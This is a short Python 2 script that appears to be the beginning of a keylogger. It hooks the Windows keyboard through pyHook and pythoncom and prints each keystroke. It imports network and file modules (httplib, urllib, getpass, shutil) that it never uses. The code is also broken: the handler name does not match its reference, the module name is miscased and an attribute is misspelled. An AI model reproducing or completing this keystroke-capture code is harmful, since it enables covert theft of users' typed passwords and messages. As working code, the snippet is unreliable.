import pyHook,pythoncom,sys,os,httplib,urllib,getpass,shutil

def OnKeyboardevent(event):
    print event.Acsii

hooks_manager=pyhook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
